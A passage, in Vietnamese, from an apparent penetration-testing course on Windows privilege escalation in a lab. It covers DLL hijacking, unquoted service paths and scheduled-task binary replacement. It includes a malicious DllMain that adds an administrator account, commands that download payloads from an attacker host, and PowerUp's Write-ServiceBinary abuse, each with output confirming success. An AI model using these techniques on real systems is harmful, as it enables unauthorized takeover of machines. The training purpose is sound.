Trước khi tạo DLL, hãy xem nhanh cách một DLL được attach hoạt động như thế nào và vì sao nó có thể dẫn tới code execution. Mỗi DLL có thể có một entry point function tùy chọn tên là DllMain, được thực thi khi process hoặc thread attach DLL. Hàm này thường chứa bốn case tên là DLL_PROCESS_ATTACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH. Các case này xử lý các tình huống khi DLL được load hoặc unload bởi một process hoặc thread. Chúng thường được dùng để thực hiện các tác vụ khởi tạo cho DLL hoặc các tác vụ liên quan tới việc thoát DLL. Nếu một DLL không có entry point function DllMain, nó chỉ cung cấp tài nguyên.

Listing sau đây cho thấy một ví dụ code từ Microsoft, phác thảo một DLL cơ bản bằng C++ chứa bốn case này. Code DLL chứa entry point function DllMain và các case đã nêu trong một switch statement. Tùy theo giá trị của ul_reason_for_call mà một trong các case sẽ được thực thi. Hiện tại, tất cả case chỉ dùng break.

```cpp
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
		        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
		        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
		        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
		        break;
    }
    return TRUE;
}
```

                                       *Listing 59 – Ví dụ code về một DLL cơ bản bằng C++*

Các comment do Microsoft cung cấp nói rằng DLL_PROCESS_ATTACH được dùng khi một process đang load DLL. Vì process binary mục tiêu trong ví dụ của chúng ta cố load DLL, đây là case mà chúng ta cần thêm code của mình vào.

Hãy tái sử dụng C code từ phần trước bằng cách thêm include statement cũng như các lệnh gọi hàm system vào code DLL C++. Ngoài ra, chúng ta cần dùng include statement cho header windows.h vì chúng ta sử dụng các data type đặc thù Windows như BOOL. Code cuối cùng được hiển thị trong listing sau.

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
		        int i;
		  	    i = system ("net user dave3 password123! /add");
		  	    i = system ("net localgroup administrators dave3 /add");
		        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
		        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
			      break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
		        break;
    }
    return TRUE;
}
```

                                              *Listing 60 – Ví dụ code DLL C++ từ Microsoft*

Bây giờ, hãy cross-compile code với mingw. Chúng ta dùng cùng lệnh như trong phần trước nhưng thay đổi file code đầu vào, tên output, và thêm --shared để chỉ định rằng chúng ta muốn build một DLL.

```
kali@kali:~$ x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

                                      *Listing 61 – Cross-compile code C++ thành DLL 64-bit*

Khi DLL đã được compile, chúng ta có thể chuyển nó tới CLIENTWK220. Chúng ta có thể khởi chạy một Python3 web server trên Kali trong thư mục chứa DLL và dùng iwr trong một cửa sổ PowerShell trên máy mục tiêu.

Trong quá trình dùng iwr để tải file, chúng ta chỉ định FileZilla FTP Client path làm tham số OutFile để đảm bảo DLL được đặt đúng vị trí.

```
PS C:\Users\steve> iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```

                                                            *Listing 62 – Tải DLL đã compile*

TextShaping.dll hiện nằm trong thư mục C:\FileZilla\FileZilla FTP Client, đây là path đầu tiên trong DLL search order. Để DLL hijacking được kích hoạt, FileZilla FTP Client cần được khởi chạy; tuy nhiên, điều quan trọng cần nhớ là privilege mà DLL sẽ chạy phụ thuộc vào privilege dùng để khởi chạy ứng dụng. Nếu chúng ta khởi chạy FTP client với user steve thì chúng ta sẽ không có đủ privilege để thêm một user mới vào hệ thống và đưa user đó vào group Administrators.

Với điều này, chúng ta không nhất thiết phải tự khởi chạy ứng dụng. Chúng ta có lựa chọn chờ một ai đó có privilege cao hơn chạy ứng dụng và kích hoạt việc load DLL malicious của chúng ta.

```
PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave3                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave3
daveadmin
offsec
The command completed successfully.
```

                              *Listing 63 – Xác nhận dave3 đã được tạo làm local administrator*

Sau vài phút, chúng ta có thể thấy output từ Listing 63 cho biết dave3 đã được tạo và được thêm vào local group Administrators, nghĩa là ai đó có privilege cao hơn đã khởi chạy ứng dụng. Tuyệt vời!

Hãy tóm tắt ngắn gọn những gì chúng ta đã làm trong phần này. Thông qua thông tin thu được từ The Exploit Database và Process Monitor, chúng ta xác định rằng FileZilla FTP Client đang load DLL TextShaping.dll từ installation path của ứng dụng. Vì chúng ta có thể ghi vào thư mục này, vốn cũng là thư mục đầu tiên trong DLL search order do Microsoft chỉ định, DLL malicious của chúng ta đã được load và thực thi khi service được restart.

---

## 2.3. Unquoted Service Paths

---

Một vector tấn công thú vị khác có thể dẫn đến privilege escalation trên các hệ điều hành Windows xoay quanh unquoted service paths. Chúng ta có thể sử dụng tấn công này khi chúng ta có Write permissions tới main directory của một service hoặc các subdirectory nhưng không thể thay thế file bên trong chúng.

Như chúng ta đã học ở các phần trước, mỗi Windows service ánh xạ tới một executable file sẽ được chạy khi service được khởi động. Nếu đường dẫn của file này chứa một hoặc nhiều dấu cách và không được bao trong dấu ngoặc kép, nó có thể trở thành một cơ hội cho một cuộc tấn công privilege escalation.

Khi một service được khởi động và một process được tạo, hàm Windows CreateProcess được sử dụng. Khi xem tham số đầu tiên của hàm, lpApplicationName được dùng để chỉ định tên và tùy chọn là path tới executable file. Nếu chuỗi được cung cấp chứa dấu cách và không được đặt trong dấu ngoặc kép, nó có thể được diễn giải theo nhiều cách vì hàm không rõ phần nào là tên file kết thúc và phần nào là arguments bắt đầu. Để xác định điều này, hàm bắt đầu diễn giải path từ trái sang phải cho đến khi gặp một dấu cách. Với mỗi dấu cách trong file path, hàm sẽ dùng phần đứng trước làm tên file bằng cách thêm .exe và phần còn lại làm arguments.

Hãy minh họa điều này với ví dụ về unquoted service binary path `C:\Program Files\My Program\My Service\service.exe`. Khi Windows khởi động service, nó sẽ dùng thứ tự sau để thử khởi chạy executable file do các dấu cách trong path.

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

            *Listing 64 – Ví dụ về cách Windows sẽ thử định vị đúng path của một unquoted service*

Listing 64 cho thấy thứ tự Windows cố gắng diễn giải service binary path để định vị executable file.

Để khai thác và làm lệch (subvert) lời gọi unquoted service gốc, chúng ta phải tạo một executable malicious, đặt nó vào một directory tương ứng với một trong các path đã được diễn giải, và khớp tên của nó với filename đã được diễn giải. Sau đó, khi service được khởi động, file của chúng ta sẽ được thực thi với cùng privilege mà service khởi chạy. Thường thì đó là account LocalSystem, dẫn đến một cuộc tấn công privilege escalation thành công.

Trong bối cảnh ví dụ, chúng ta có thể đặt tên executable của mình là Program.exe và đặt nó trong C:, My.exe và đặt nó trong C:\Program Files, hoặc My.exe và đặt nó trong C:\Program Files\My Program. Tuy nhiên, hai lựa chọn đầu sẽ đòi hỏi các permission khó xảy ra vì standard user mặc định không có quyền ghi vào các thư mục đó. Lựa chọn thứ ba khả thi hơn vì nó là main directory của phần mềm. Nếu một administrative user hoặc developer đặt permission cho thư mục này quá “thoáng”, chúng ta có thể đặt binary malicious ở đó.

Bây giờ khi chúng ta đã có hiểu biết cơ bản về vulnerability này, hãy dùng nó trong một ví dụ. Chúng ta kết nối tới CLIENTWK220 với user steve (password securityIsNotAnOption++++++) qua RDP. Chúng ta mở PowerShell và enumerate các service đang chạy và đã dừng.

```
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName 

Name                      State   PathName
----                      -----   --------
...
GammaService                             Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
...
```

                                              *Listing 65 – Danh sách service với binary path*

Listing 65 cho thấy một service đang dừng tên là GammaService. Unquoted service binary path chứa nhiều dấu cách và do đó có khả năng dễ bị tổn thương với vector này.

Một cách hiệu quả hơn để xác định dấu cách trong path và thiếu dấu ngoặc kép là dùng công cụ WMI command-line (WMIC). Chúng ta có thể nhập service để lấy thông tin service và động từ get với name và pathname làm tham số để chỉ lấy các giá trị property này. Chúng ta sẽ pipe output của lệnh này sang findstr với /i để tìm không phân biệt hoa thường và /v để chỉ in ra các dòng không khớp. Là tham số cho lệnh này, chúng ta nhập "C:\Windows" để chỉ hiển thị các service có binary path nằm ngoài thư mục Windows. Chúng ta sẽ pipe output của lệnh này sang một lệnh findstr khác, dùng """ làm tham số để chỉ in ra các kết quả khớp mà không có dấu ngoặc kép.

Hãy nhập lệnh này trong cmd.exe thay vì PowerShell để tránh vấn đề escape với dấu ngoặc kép trong lệnh findstr thứ hai. Hoặc, chúng ta có thể dùng Select-String trong PowerShell.

```
C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
Name                                       PathName                                                                     
...                                                                                                         
GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

              *Listing 66 – Danh sách service có dấu cách và thiếu dấu ngoặc kép trong binary path*

Output của lệnh này chỉ liệt kê các service có khả năng dễ bị tổn thương với vector của chúng ta, chẳng hạn như GammaService.

Trước khi tiếp tục, hãy kiểm tra xem chúng ta có thể start và stop service đã xác định với tư cách steve bằng Start-Service và Stop-Service hay không.

```
PS C:\Users\steve> Start-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...

PS C:\Users\steve> Stop-Service GammaService
```

*Listing 67 – Dùng Start-Service và Stop-Service để kiểm tra xem user steve có permission start/stop GammaService hay không*

Output từ Listing 67 cho thấy steve có permission để start và stop GammaService.

Vì chúng ta có thể tự restart service, chúng ta không cần phải reboot để restart service. Tiếp theo, hãy liệt kê các path mà Windows dùng để thử định vị executable file của service.

```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

       *Listing 68 – Cách Windows cố gắng định vị đúng path của unquoted service GammaService*

Hãy kiểm tra access right của chúng ta trong các path này với icacls. Chúng ta sẽ bắt đầu với hai path đầu từ Listing 68.

```
PS C:\Users\steve> icacls "C:\"
C:\ BUILTIN\Administrators:(OI)(CI)(F)
    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
    BUILTIN\Users:(OI)(CI)(RX)
    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
    NT AUTHORITY\Authenticated Users:(AD)
    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
    
Successfully processed 1 files; Failed processing 0 files
    
PS C:\Users\steve> icacls "C:\Program Files"
C:\Program Files NT SERVICE\TrustedInstaller:(F)
                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(M)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 BUILTIN\Administrators:(M)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 BUILTIN\Users:(RX)
                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
                 CREATOR OWNER:(OI)(CI)(IO)(F)
...

Successfully processed 1 files; Failed processing 0 files
```

                        *Listing 69 – Xem xét permission trên các path C:\ và C:\Program Files**

Như dự đoán, user steve, với tư cách là thành viên của BUILTIN\Users và NT AUTHORITY\AUTHENTICATED Users, không có Write permissions trong cả hai path. Bây giờ, hãy kiểm tra path của lựa chọn thứ ba. Chúng ta có thể bỏ qua path thứ tư vì nó là service binary tự nó.

```
PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                 BUILTIN\Administrators:(OI)(CI)(F)
                                 BUILTIN\Users:(OI)(CI)(RX,W)
                                 CREATOR OWNER:(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```

                              *Listing 70 – Xem xét permission trên thư mục Enterprise Apps*

Listing 70 cho thấy BUILTIN\Users có Write (w) permissions trên path C:\Program Files\Enterprise Apps. Mục tiêu của chúng ta bây giờ là đặt một file malicious tên Current.exe trong C:\Program Files\Enterprise Apps.

Chúng ta có thể tái sử dụng binary adduser.exe bằng cách compile C code từ phần “Service Binary Hijacking”. Trên Kali, chúng ta khởi chạy một Python3 web server trong directory chứa file executable để phục vụ nó.

Khi web server đang chạy, chúng ta có thể tải adduser.exe trên máy mục tiêu với user steve. Để lưu file với đúng tên cho cuộc tấn công privilege escalation của chúng ta, chúng ta nhập Current.exe làm tham số cho -Outfile. Sau khi file được tải, chúng ta copy nó vào C:\Program Files\Enterprise Apps.

```
PS C:\Users\steve> iwr -uri http://192.168.48.3/adduser.exe -Outfile Current.exe

PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

         *Listing 71 – Tải adduser.exe, lưu dưới tên Current.exe, và copy vào thư mục Enterprise Apps*

Bây giờ, mọi thứ đã sẵn sàng để chúng ta start service, thứ sẽ thực thi Current.exe thay vì service binary gốc GammaServ.exe. Để làm điều này, chúng ta dùng Start-Service với GammaService làm tham số. Chúng ta có thể dùng net user để kiểm tra dave2 đã được tạo chưa và net localgroup administrators để xác nhận dave2 đã được thêm vào local Administrators group.

```
PS C:\Users\steve> Start-Service GammaService
Start-Service : Service 'GammaService (GammaService)' cannot be started due to the following error: Cannot start
service GammaService on computer '.'.
At line:1 char:1
+ Start-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
   ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
    
PS C:\Users\steve> net user

Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup administrators
...
Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```

*Listing 72 – Start service GammaService và xác nhận dave2 đã được tạo làm thành viên của local Administrators group*

Listing 72 cho thấy lệnh Start-Service hiển thị lỗi rằng Windows không thể start service. Lỗi bắt nguồn từ việc C code cross-compiled của chúng ta không chấp nhận các tham số còn sót lại từ service binary path gốc. Tuy nhiên, Current.exe vẫn được thực thi và dave2 đã được tạo như một member của local Administrators group. Tuyệt vời!

Để khôi phục chức năng của service gốc, chúng ta phải stop service và xóa binary Current.exe của chúng ta. Sau khi file executable bị xóa, Windows sẽ dùng lại service binary GammaServ.exe khi service được start.

Trước khi kết thúc phần này, hãy kiểm tra xem PowerUp có nhận diện vulnerability này hay không. Để làm điều này, chúng ta tải PowerUp với iwr và import nó vào một PowerShell session như đã làm trước đó. Sau đó chúng ta set ExecutionPolicy thành Bypass và dùng Get-UnquotedService.

```
PS C:\Users\steve> iwr http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1

PS C:\Users\steve> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\steve> . .\PowerUp.ps1

PS C:\Users\steve> Get-UnquotedService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService
...
```

              *Listing 73 – Dùng Get-UnquotedService để liệt kê các service có khả năng vulnerable*

Listing 73 cho thấy GammaService đã được xác định là vulnerable. Hãy dùng AbuseFunction và restart service để thử nâng quyền. Với -Path, chúng ta nhập cùng path cho Current.exe như đã làm trong Listing 71. Như đã nói trước đó, hành vi mặc định là tạo một local user mới tên john với password Password123!. Ngoài ra, user này được thêm vào local Administrators group.

```
PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

ServiceName  Path                                         Command
-----------  ----                                         -------
GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123! /add && timeout /t 5 && net loc...

PS C:\Users\steve> Restart-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...
Restart-Service : Failed to start service 'GammaService (GammaService)'.
At line:1 char:1
+ Restart-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Restart-Service]
   , ServiceCommandException
    + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.RestartServiceCommand

PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    john            offsec
steve                    WDAGUtilityAccount

The command completed successfully.

PS C:\Users\steve> net localgroup administrators
...
john
...
```

            *Listing 74 – Dùng AbuseFunction để exploit unquoted service path của GammaService*

Output của các lệnh trong Listing 74 cho thấy bằng cách dùng AbuseFunction, Write-ServiceBinary, user john đã được tạo làm local administrator. Rất tốt!

Trong phần này, chúng ta đã đề cập một vector privilege escalation khác liên quan đến Windows services. Chúng ta học cách xác định các service thiếu dấu ngoặc kép và có chứa dấu cách trong service binary path. Ngoài ra, chúng ta học cách Windows cố gắng xác định đúng executable file path trong tình huống này. Bằng cách tìm một writable directory phù hợp cho vulnerability này, chúng ta có thể đặt một file executable malicious vào path, và file này được thực thi khi service được start. Cuối cùng, chúng ta đã tự động hóa việc khai thác vector này bằng các function Get-UnquotedService và Write-ServiceBinary của PowerUp.

Mặc dù vulnerability này yêu cầu một tổ hợp yêu cầu cụ thể, nó dễ bị khai thác và là một vector privilege escalation đáng để cân nhắc.

---

# 3. Lạm dụng các thành phần Windows khác

---

Learning Unit này bao gồm các **Learning Objectives** sau:

- Khai thác **Scheduled Tasks** để nâng cao quyền (privilege escalation)
- Hiểu **các loại exploit khác nhau** dẫn đến privilege escalation
- Lạm dụng **privileges** để thực thi mã với tư cách các user account có quyền cao

Trong Learning Unit trước, chúng ta đã sử dụng các vector privilege escalation liên quan đến **Windows services**. Tuy nhiên, đây **không phải** là thành phần Windows duy nhất mà chúng ta có thể lạm dụng để nâng cao quyền.

Trong Learning Unit này, chúng ta sẽ khám phá **Scheduled Tasks** và các **exploit nhắm trực tiếp vào Windows** để thực hiện các cuộc tấn công privilege escalation.

---

## 3.1. Scheduled Tasks

---

Windows sử dụng **Task Scheduler** để thực thi các tác vụ tự động khác nhau, chẳng hạn như các hoạt động dọn dẹp hoặc quản lý cập nhật. Trên Windows, chúng được gọi là **Scheduled Tasks**, hoặc **Tasks**, và được định nghĩa với một hoặc nhiều **trigger**. Một trigger được sử dụng như một điều kiện, khiến một hoặc nhiều **action** được thực thi khi điều kiện đó được thỏa mãn. Ví dụ, một trigger có thể được thiết lập theo thời gian và ngày cụ thể, khi khởi động, khi đăng nhập, hoặc khi xảy ra một sự kiện Windows. Một action xác định chương trình hoặc script nào sẽ được thực thi. Ngoài ra còn có nhiều cấu hình khác cho một task, được phân loại trong các tab **Conditions**, **Settings**, và **General** của phần thuộc tính của task.

Đối với chúng ta, có ba mảnh thông tin quan trọng cần thu thập từ một scheduled task để xác định các vector privilege escalation tiềm năng:

- Task này được thực thi dưới user account (principal) nào?
- Những trigger nào được chỉ định cho task?
- Những action nào được thực thi khi một hoặc nhiều trigger này được thỏa mãn?

Câu hỏi thứ nhất giúp chúng ta hiểu liệu việc lạm dụng task này có dẫn đến privilege escalation hay không. Nếu task được thực thi trong context của user hiện tại của chúng ta, thì nó sẽ không dẫn đến việc nâng quyền. Tuy nhiên, nếu task chạy dưới NT AUTHORITY\SYSTEM hoặc một user có quyền quản trị, thì một cuộc tấn công thành công có thể dẫn đến privilege escalation.

Câu hỏi thứ hai rất quan trọng vì nếu điều kiện trigger đã được thỏa mãn trong quá khứ, task sẽ không chạy lại trong tương lai và do đó không phải là một mục tiêu khả thi đối với chúng ta. Ngoài ra, nếu chúng ta đang trong một penetration test kéo dài một tuần, nhưng task chỉ chạy sau khoảng thời gian này, thì chúng ta nên tìm một vector privilege escalation khác. Tuy nhiên, chúng ta vẫn nên đề cập phát hiện này trong báo cáo penetration testing cho khách hàng.

Trong khi hai câu hỏi đầu tiên giúp chúng ta hiểu liệu task này có phải là một lựa chọn cho một cuộc tấn công privilege escalation hay không, thì câu trả lời cho câu hỏi thứ ba sẽ quyết định cách chúng ta có thể thực hiện việc privilege escalation tiềm năng. Trong phần lớn các trường hợp, chúng ta có thể tận dụng các kỹ thuật quen thuộc như thay thế binary hoặc đặt một DLL bị thiếu, tương tự như những gì chúng ta đã làm với services trong Learning Unit trước. Mặc dù chúng ta không có service binary với scheduled tasks, nhưng chúng ta có các chương trình và script được chỉ định bởi các action.

Hãy cùng đi qua một ví dụ trong đó chúng ta cố gắng nâng quyền bằng cách thay thế một binary được chỉ định trong một action. Để làm điều này, chúng ta sẽ kết nối lại với CLIENTWK220 dưới user steve (password securityIsNotAnOption++++++) thông qua RDP và mở một cửa sổ PowerShell.

Chúng ta có thể xem các scheduled task trên Windows bằng Cmdlet `Get-ScheduledTask` hoặc lệnh schtasks /query. Trong ví dụ này, chúng ta sẽ sử dụng cách thứ hai để xem toàn bộ scheduled task trên CLIENTWK220. Chúng ta nhập /fo với giá trị LIST để chỉ định định dạng output là dạng danh sách. Ngoài ra, chúng ta thêm /v để hiển thị tất cả các thuộc tính của một task.

Sau khi thực thi lệnh, chúng ta sẽ nhận được một lượng output rất lớn chứa thông tin về tất cả các scheduled task trên hệ thống. Chúng ta nên tìm kiếm các thông tin đáng chú ý trong các trường **Author**, **TaskName**, **Task To Run**, **Run As User**, và **Next Run Time**. Trong ngữ cảnh của chúng ta, “đáng chú ý” có nghĩa là các thông tin này trả lời một phần hoặc toàn bộ ba câu hỏi ở trên.

```
PS C:\Users\steve> schtasks /query /fo LIST /v
...
Folder: \Microsoft
HostName:                             CLIENTWK220
TaskName:                             \Microsoft\CacheCleanup
Next Run Time:                        7/11/2022 2:47:21 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/11/2022 2:46:22 AM
Last Result:                          0
Author:                               CLIENTWK220\daveadmin
Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In:                             C:\Users\steve\Pictures
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          daveadmin
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           7:37:21 AM
Start Date:                           7/4/2022
...
```

                     *Listing 75 - Hiển thị danh sách tất cả scheduled tasks trên CLIENTWK220*

Listing 75 cho thấy thông tin về một task có tên \Microsoft\CacheCleanup. Điều đáng chú ý là task này được tạo bởi daveadmin và action được chỉ định là thực thi BackendCacheCleanup.exe trong thư mục Pictures thuộc home directory của steve. Ngoài ra, các mốc thời gian ở Last Run Time và Next Run Time cho thấy task này được thực thi mỗi phút. Task chạy dưới user daveadmin.

Vì executable file BackendCacheCleanup.exe nằm trong một thư mục con của home directory của steve, nên chúng ta có khả năng cao sẽ có quyền truy cập rộng đối với file này. Hãy kiểm tra quyền của chúng ta trên file này bằng icacls.

```
PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                BUILTIN\Administrators:(I)(F)
                                                CLIENTWK220\steve:(I)(F)
                                                CLIENTWK220\offsec:(I)(F)
```

                     *Listing 76 - Hiển thị quyền trên executable file BackendCacheCleanup.exe*

Như mong đợi, chúng ta có quyền **Full Access (F)**, vì executable file nằm trong home directory của steve. Bây giờ, chúng ta có thể sử dụng lại binary adduser.exe để thay thế executable file được chỉ định trong action của scheduled task.

Để thực hiện điều này, chúng ta sẽ khởi động một Python3 web server để phục vụ file adduser.exe đã được cross-compile và sử dụng iwr để tải nó về CLIENTWK220. Chúng ta cũng sẽ sao lưu file BackendCacheCleanup.exe gốc để có thể khôi phục lại sau khi cuộc tấn công privilege escalation thành công.

```
PS C:\Users\steve> iwr -Uri http://192.168.48.3/adduser.exe -Outfile BackendCacheCleanup.exe

PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak

PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
```

                        *Listing 77 - Tải xuống và thay thế executable file BackendCacheCleanup.exe*

Khi scheduled task được thực thi lại, user dave2 sẽ được tạo và thêm vào local Administrators group. Sau khi chờ một phút, chúng ta có thể kiểm tra xem cuộc tấn công privilege escalation đã thành công hay chưa.

```
PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```

          *Listing 78 - Hiển thị kết quả sau khi thay thế executable file BackendCacheCleanup.exe*

Listing 78 cho thấy rằng chúng ta đã thay thế thành công executable file được sử dụng bởi scheduled task để tạo một user có quyền quản trị mà chúng ta kiểm soát. Rất tốt!

Trong phần này, chúng ta đã khai thác một cuộc tấn công privilege escalation tương tự như trong phần **“Service Binary Hijacking”**. Tuy nhiên, lần này chúng ta tập trung vào **scheduled tasks** thay vì Windows services. Chúng ta đã học cách enumerate scheduled tasks một cách hiệu quả và những thuộc tính nào có thể đáng quan tâm. Cuối cùng, chúng ta đã thay thế executable file và tạo user dave2, là thành viên của local Administrators group.

---

## 3.2. Sử dụng Exploits

---

Trong các phần trước, chúng ta đã cố gắng nâng quyền bằng cách tìm kiếm thông tin nhạy cảm trên hệ thống hoặc lạm dụng các thành phần Windows như Windows services hoặc scheduled tasks. Trong phần này, chúng ta sẽ thảo luận ba loại exploit khác nhau dẫn đến privilege escalation và sau đó minh họa hai trong số đó bằng một ví dụ.

Loại thứ nhất là khai thác các lỗ hổng dựa trên ứng dụng. Các ứng dụng được cài đặt trên một hệ thống Windows có thể chứa nhiều loại lỗ hổng khác nhau như chúng ta đã học trong Module “Locating Public Exploits”. Nếu các ứng dụng này chạy với quyền quản trị và chúng ta có thể khai thác một lỗ hổng dẫn đến code execution, chúng ta cũng có thể nâng quyền thành công.

Loại thứ hai là khai thác các lỗ hổng trong Windows Kernel. Tuy nhiên, nghiên cứu lỗ hổng và các kỹ thuật exploit liên quan trong hầu hết trường hợp là khá nâng cao và đòi hỏi hiểu biết sâu về hệ điều hành Windows. Với mục đích của Module này, chỉ cần hiểu rằng tồn tại các Windows kernel exploit và chúng có thể được dùng để privilege escalation là đủ.

Trước khi chúng ta mù quáng tải xuống và sử dụng một kernel exploit, chúng ta cần cân nhắc rằng các loại exploit này có thể dễ dàng làm crash một hệ thống. Tùy theo rules of engagement của một penetration test, chúng ta có thể không được phép sử dụng các phương pháp có khả năng làm gián đoạn dịch vụ hoặc hệ thống. Do đó, chúng ta nên luôn hiểu rõ các giới hạn, phần loại trừ, và ranh giới của mình trong một đánh giá thực tế. Những lời cảnh báo này không nên khiến chúng ta tránh hoàn toàn mọi kernel exploit, mà nên cung cấp cho chúng ta đúng mindset khi làm việc với chúng.

Hãy minh họa cách chúng ta có thể tận dụng kernel exploits trong một ví dụ bằng cách kết nối tới CLIENTWK220 qua RDP với user steve và password securityIsNotAnOption++++++. Chúng ta sẽ mở PowerShell và dùng whoami /priv để hiển thị các privilege được gán cho steve.

```
PS C:\Users\steve> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

                        *Listing 79 - Đăng nhập qua RDP với steve và kiểm tra các privilege hiện tại*

